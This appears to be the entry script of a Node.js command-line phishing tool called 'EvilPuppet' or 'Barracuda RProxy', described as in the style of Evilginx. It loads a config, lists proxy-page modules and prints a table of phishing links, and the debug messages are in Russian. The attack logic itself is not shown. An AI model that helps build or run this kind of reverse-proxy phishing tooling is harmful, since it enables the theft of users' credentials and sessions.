const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const { startInteractiveMode } = require('./commands');

function displayBanner() {
  console.log(chalk.yellow('Отладка: Вывод баннера...'));
  const banner = ['Barracuda RProxy'];
  const maxWidth = 20; // Упрощённая ширина для теста
  const coloredBanner = banner.map(line => {
    const padding = Math.floor((maxWidth - line.length) / 2);
    return chalk.cyan(' '.repeat(padding) + line + ' '.repeat(padding));
  });
  coloredBanner.forEach(line => console.log(line));
  console.log(chalk.yellow('Отладка: Баннер выведен.'));
}

function displayTable() {
  try {
    console.log(chalk.yellow('Отладка: Начало загрузки конфигурации...'));
    const configPath = path.join(__dirname, 'config.json');
    console.log(chalk.yellow('Отладка: Путь к config.json:', configPath));

    let config;
    try {
      console.log(chalk.yellow('Отладка: Чтение config.json...'));
      const configContent = fs.readFileSync(configPath, 'utf8');
      console.log(chalk.yellow('Отладка: Содержимое config.json:', configContent));
      config = JSON.parse(configContent);
      console.log(chalk.yellow('Отладка: Конфигурация:', JSON.stringify(config)));
    } catch (e) {
      console.log(chalk.red('Отладка: Ошибка загрузки config.json:', e.message));
      config = { domain: 'не установлен', ip: '127.0.0.1', port: 1000, scheme: 'https' };
      console.log(chalk.yellow('Отладка: Использована резервная конфигурация:', JSON.stringify(config)));
    }

    const proxyPageDir = path.join(__dirname, 'proxy_page');
    console.log(chalk.yellow('Отладка: Проверка директории:', proxyPageDir));
    let files = [];
    try {
      files = fs.readdirSync(proxyPageDir).filter(file => file.endsWith('.js'));
      console.log(chalk.yellow('Отладка: Список файлов:', files.join(', ')));
    } catch (e) {
      console.log(chalk.yellow('Отладка: Директория proxy_page не найдена или недоступна:', e.message));
    }

    const data = [];
    if (files.length > 0) {
      for (const file of files) {
        console.log(chalk.yellow('Отладка: Обработка файла:', file));
        try {
          const filePath = path.join(proxyPageDir, file);
          const fileContent = fs.readFileSync(filePath, 'utf8');
          console.log(chalk.yellow('Отладка: Содержимое файла:', fileContent));
          const proxyConfig = require(filePath);
          console.log(chalk.yellow('Отладка: Модуль:', JSON.stringify(proxyConfig)));
          const item = {
            ProxyPage: file.replace('.js', ''),
            Domain: config.domain,
            PhishingLink: `${config.scheme}://${config.ip}:${config.port}`,
            IP: config.ip
          };
          data.push(item);
          console.log(chalk.yellow('Отладка: Данные:', JSON.stringify(item)));
        } catch (e) {
          console.log(chalk.red('Ошибка при загрузке файла:', file, e.message));
        }
      }
    } else {
      console.log(chalk.yellow('Отладка: Директория proxy_page пуста или отсутствует, данные не загружены.'));
    }

    console.log(chalk.yellow('Отладка: Количество данных:', data.length));
    console.log(chalk.yellow('Отладка: Все данные:', JSON.stringify(data)));
    if (data.length === 0) {
      console.log(chalk.yellow('Нет данных для отображения.'));
    } else {
      console.log(chalk.green.bold('EvilPuppet CLI (в стиле Evilginx)'));
      data.forEach(item => {
        console.log(
          chalk.white('  ') +
          chalk.cyan(item.ProxyPage.padEnd(12)) +
          chalk.white(item.Domain.padEnd(15)) +
          chalk.green(item.PhishingLink.padEnd(30)) +
          chalk.white(item.IP)
        );
      });
    }
  } catch (error) {
    console.log(chalk.red('Ошибка при формировании вывода:', error.message));
  }
}

async function main() {
  displayBanner();
  displayTable();
  await startInteractiveMode();
}

main().catch(err => console.log(chalk.red('Ошибка:', err.message)));